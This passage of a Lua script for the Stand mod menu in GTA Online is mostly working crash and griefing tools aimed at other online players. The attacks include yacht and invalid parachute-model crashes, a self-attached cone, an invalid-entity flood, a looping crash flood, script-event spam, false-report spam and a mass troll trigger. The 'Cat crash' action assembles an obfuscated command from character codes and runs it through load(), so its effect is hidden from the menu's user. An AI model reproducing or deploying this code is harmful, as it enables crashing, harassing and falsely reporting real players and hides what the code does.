            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(Crash, "Yatchy V2", {"bigyachtyv2"}, "Crash event (A1:E8958704) sending prop yacht001.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy001")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(Crash, "Yatchy V3", {"bigyachtyv3"}, "Crash event (A1:1A7AEACE) sending prop yacht002.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy002")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(Crash, "Yatchy V4", {"bigyachtyv4"}, "Crash event (A1:408D3AA0) sending prop apayacht.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    

    menu.action(Crash, "Yatchy V5", {"bigyachtyv5"}, "Crash event (A1:B36122B5) sending prop yachtwin.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht_win")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)


    menu.action(Crash, "Invalidparacrash", {}, "Will trigger 'A1:FBF7D21F'", function()
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(pid, function() 
            util.yield(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        end)
    end)


    local c
    c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local kitteh_hash = util.joaat("a_c_cat_01")
    util.request_model(kitteh_hash)

    local crash_tbl = {
        "SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE",
        "6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH",
        "GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",
    }

    local crash_tbl_2 = {
        {17, 32, 48, 69},
        {14, 30, 37, 46, 47, 63},
        {9, 27, 28, 60}
    }

    menu.action(Crash, "Cat crash", {}, "Problably won't work might be removed", function()
        local cur_crash_meth = ""
        local cur_crash = ""
        for a,b in pairs(crash_tbl_2) do
            cur_crash = ""
            for c,d in pairs(b) do
                cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
            end
            cur_crash_meth = cur_crash_meth .. cur_crash
        end

        local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
        local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
        local crash_str = ""

        for k,v in pairs(crash_table) do
            crash_str = crash_str .. string.char(crash_table[k])
        end

        for k,v in pairs(crash_keys) do
            print(k + (k*128))
        end

        c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        util.request_model(kitteh_hash)
        local kitteh = entities.create_ped(28, kitteh_hash, c, math.random(0, 270))
        AUDIO.PLAY_PAIN(kitteh, 7, 0)
        menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(players.user()))
        util.yield(500)
        for i=1, math.random(10000, 12000) do
        end
        local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. PLAYER.GET_PLAYER_NAME(player_id) .. '\")')
        pcall(crash_compiled_func)
    end)


    local function on_player_leave(player_id)
        if player_id == pid then
            player_left = true
        end
    end

    players.on_leave(on_player_leave)

    menu.action(Crash, "Cone Crash", {"conecrash"}, "Will trigger 'XQ'", function()
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local cone = OBJECT.CREATE_OBJECT_NO_OFFSET(-1364166376, c['x'], c['y'], c['z'], true, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cone, cone, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
    end)

	
    models = {
    "h4_prop_bush_buddleia_low_01",
    "h4_prop_bush_ear_aa",
    "h4_prop_bush_ear_ab",
    "h4_prop_bush_fern_low_01",
    "h4_prop_bush_fern_tall_cc",
    "h4_prop_bush_mang_ad",
    "h4_prop_bush_mang_low_aa",
    "h4_prop_bush_mang_low_ab",
    "h4_prop_bush_seagrape_low_01",
    "h4_prop_grass_med_01",
    "h4_prop_grass_tropical_lush_01",
    "h4_prop_grass_wiregrass_01",
    "h4_prop_weed_groundcover_01",
    "ng_proc_temp",
    "proc_brittlebush_01",
    "proc_desert_sage_01",
    "proc_dry_plants_01",
    "proc_drygrasses01",
    "proc_drygrasses01b",
    "proc_drygrassfronds01",
    "proc_dryplantsgrass_01",
    "proc_dryplantsgrass_02",
    "proc_forest_grass01",
    "proc_forest_ivy_01",
    "proc_grassdandelion01",
    "proc_grasses01",
    "proc_grasses01b",
    "proc_grassfronds01",
    "proc_grassplantmix_01",
    "proc_grassplantmix_02",
    "proc_indian_pbrush_01",
    "proc_leafybush_01",
    "proc_leafyplant_01",
    "proc_lizardtail_01",
    "proc_lupins_01",
    "proc_meadowmix_01",
    "proc_meadowpoppy_01",
    "proc_sage_01",
    "proc_scrub_bush01",
    "proc_sml_reeds_01",
    "proc_sml_reeds_01b",
    "proc_sml_reeds_01c",
    "proc_stones_01",
    "proc_stones_02",
    "proc_stones_03",
    "proc_stones_04",
    "proc_stones_05",
    "proc_stones_06",
    "proc_wildquinine",
    "prop_dandy_b",
    "prop_dryweed_002_a",
    "prop_fernba",
    "prop_fernbb",
    "prop_flowerweed_005_a",
    "prop_grass_001_a",
    "prop_grass_ca",
    "prop_grass_da",
    "prop_grass_dry_02",
    "prop_grass_dry_03",
    "prop_log_aa",
    "prop_log_ab",
    "prop_log_ac",
    "prop_log_ad",
    "prop_log_ae",
    "prop_log_af",
    "prop_saplin_001_b",
    "prop_saplin_001_c",
    "prop_saplin_002_b",
    "prop_saplin_002_c",
    "prop_small_bushyba",
    "prop_tall_drygrass_aa",
    "prop_tall_grass_ba",
    "prop_thindesertfiller_aa",
    "prop_weed_001_aa",
    "prop_weed_002_ba",
    "urbandryfrnds_01",
    "urbandrygrass_01",
    "urbangrnfrnds_01",
    "urbangrngrass_01",
    "urbanweeds01",
    "urbanweeds01_l1",
    "urbanweeds02",
    "urbanweeds02_l1",
    "v_proc2_temp"
}   


    menu.action(Crash, "AIO Crash", {"aio"}, "This will sppawn a butt ton of invalid entities", function()
    for i, v in ipairs(models) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']

        local model_hash = util.joaat(v)
        STREAMING.REQUEST_MODEL(model_hash)
        local counter = 0
        while not STREAMING.HAS_MODEL_LOADED(model_hash) and counter < 50 do
            util.yield()
            counter = counter + 1
        end
        if STREAMING.HAS_MODEL_LOADED(model_hash) then
            local crash = entities.create_object(model_hash, v3(coords.x, coords.y, coords.z), true, false, false)
            ENTITY.SET_ENTITY_ROTATION(crash, 0.0, -90.0, 0.0, 1, true)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(model_hash)
        end
    end
  end)
    --test
    menu.toggle_loop(Crash, "Stands crashes flood", {"standbumfuck"}, "Will spam Stands crashes until the player leaves", function()
            menu.trigger_commands("crash" .. players.get_name(pid))
            menu.trigger_commands("choke" .. players.get_name(pid))
            menu.trigger_commands("flashcrash" .. players.get_name(pid))
            menu.trigger_commands("ngcrash" .. players.get_name(pid))
            menu.trigger_commands("FootLettuce" .. players.get_name(pid))
            if entities.get_user_vehicle_as_handle(false) == true then
                menu.trigger_commands("slaughter" .. players.get_name(pid))
            end
            menu.trigger_commands("steamroll" .. players.get_name(pid))
            util.yield()
        end)

    menu.toggle_loop(trolling, "Hurt there ears", {}, "Aw my ears", function()
        local coords = players.get_position(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "BED", coords.x, coords.y, coords.z, "WASTEDSOUNDS", true, 5, false)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Crash", coords.x, coords.y, coords.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 5, false)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "BASE_JUMP_PASSED", coords.x, coords.y, coords.z, "HUD_AWARDS", true, 5, false)
        util.yield(20)
    end)


    menu.toggle_loop(trolling, "Script Event Spam", {}, "Can break some shit menus will spam alot of Script events", function()
        local scriptEvents = {-2101545224, -1603050746, -2138393348, 330622597, -369672308, -702866045, 891653640, 2139870214, 1839167950, -1387723751}  
        for i, se in pairs(scriptEvents) do 
            util.trigger_script_event(1 << pid, {se, pid})
            util.yield()
        end
    end)

    menu.toggle_loop(trolling, "Report Spam", {"reportspam"}, "", function()
        menu.trigger_commands("reportgriefing" .. players.get_name(pid))
        menu.trigger_commands("reportexploits" .. players.get_name(pid))
        menu.trigger_commands("reportbugabuse" .. players.get_name(pid))
        menu.trigger_commands("reportannoying" .. players.get_name(pid))
        menu.trigger_commands("reporthate" .. players.get_name(pid))
        menu.trigger_commands("reportvcannoying" .. players.get_name(pid))
        menu.trigger_commands("reportvchate" .. players.get_name(pid))
    end)

    menu.action(trolling, "Trigger all stand trolls", {}, "This will tigger all the stand trolls", function()
        if entities.get_user_vehicle_as_handle(false) == true then
            menu.trigger_commands("killveh" .. players.get_name(pid))
            menu.trigger_commands("empveh" .. players.get_name(pid))
            menu.trigger_commands("igniteveh" .. players.get_name(pid))
            menu.trigger_commands("delveh" .. players.get_name(pid))
            menu.trigger_commands("poptires" .. players.get_name(pid))
            menu.trigger_commands("slingshot" .. players.get_name(pid))
            menu.trigger_commands("detachwheel" .. players.get_name(pid))
            menu.trigger_commands("removedoors" .. players.get_name(pid))
            menu.trigger_commands("destroyprop" .. players.get_name(pid))
            menu.trigger_commands("breakofftailboom" .. players.get_name(pid))
        end
        menu.trigger_commands("ram" .. players.get_name(pid))
        menu.trigger_commands("pwanted" .. players.get_name(pid))
        menu.trigger_commands("freeze" .. players.get_name(pid))
        menu.trigger_commands("fakemoneydrop" .. players.get_name(pid))
        menu.trigger_commands("nopassivemode" .. players.get_name(pid))
        menu.trigger_commands("confuse" .. players.get_name(pid))
        menu.trigger_commands("error" .. players.get_name(pid))
        menu.trigger_commands("ragdoll" .. players.get_name(pid))
        menu.trigger_commands("shakecam" .. players.get_name(pid))
        menu.trigger_commands("aggressivenpcs" .. players.get_name(pid))
        menu.trigger_commands("mugloop" .. players.get_name(pid))
        menu.trigger_commands("beast" .. players.get_name(pid))
        menu.trigger_commands("kill" .. players.get_name(pid))
        menu.trigger_commands("cage" .. players.get_name(pid))
        menu.trigger_commands("explode" .. players.get_name(pid))
        menu.trigger_commands("particlespam" .. players.get_name(pid))
        menu.trigger_commands("bounty" .. players.get_name(pid))
        menu.trigger_commands("notifyspam" .. players.get_name(pid))
        menu.trigger_commands("sendtocutscene" .. players.get_name(pid))
        menu.trigger_commands("sendtojob" .. players.get_name(pid))
        menu.trigger_commands("vehkick" .. players.get_name(pid))
        menu.trigger_commands("interiorkick" .. players.get_name(pid))
        menu.trigger_commands("novehs" .. players.get_name(pid))
        menu.trigger_commands("ceokick" .. players.get_name(pid))
        menu.trigger_commands("infiniteloading" .. players.get_name(pid))
        menu.trigger_commands("ring" .. players.get_name(pid))
        menu.trigger_commands("mission" .. players.get_name(pid))
        menu.trigger_commands("raid" .. players.get_name(pid))
    end)

    local money = menu.list(friendly, "Money Drops", {""}, "")
    local drop_speed = 0
    local speed = menu.slider(money, "Drop speed in ms", {}, "", 0, 5000, 0, 50, function(val)
        drop_speed = val
    end)

    local enabled = false
    menu.toggle(money, "Drop the money", {"md"}, "Drops money on the selected player", function(on)
        enabled = on
    end)

    util.create_thread(function()
        while true do
            if enabled then
                local coords = players.get_position(pid)
                coords.z = coords.z + 0.5
                local cash = MISC.GET_HASH_KEY("prop_anim_cash_pile_02")
                STREAMING.REQUEST_MODEL(cash)
                while STREAMING.HAS_MODEL_LOADED(cash) == false do
                    STREAMING.REQUEST_MODEL(cash)
                    util.yield(0)
                end
                OBJECT.CREATE_AMBIENT_PICKUP(1704231442, coords.x, coords.y, coords.z, 0, 2000, cash, false, true)
                util.yield(drop_speed)
            else
                util.yield(0)
            end
        end
    end)


local function loadModel(model)
    STREAMING.REQUEST_MODEL(model)
    while not STREAMING.HAS_MODEL_LOADED(model) do
        util.yield(0)
    end
end

local function drop_rp(pid)
    local coords = players.get_position(pid)
    coords.z = coords.z + 1.5
    local figure = MISC.GET_HASH_KEY("vw_prop_vw_colle_prbubble")
    loadModel(figure)
    OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, figure, false, true)
end

    local rp = menu.list(friendly, "RP Drops", {}, "")
    local drop_speed = 0
    local speed = menu.slider(rp, "Drop speed in ms", {}, "", 0, 5000, 0, 50, function(val)
        drop_speed = val
    end)

    local enabled = false
    menu.toggle(rp, "Drop RP", {}, "", function(on)
        enabled = on
    end)

    util.create_thread(function()
        while true do
            if enabled then
                drop_rp(pid)
                util.yield(drop_speed)
            else
                util.yield(0)
            end
        end
    end)
end


players.on_join(player)
players.dispatch_on_join()
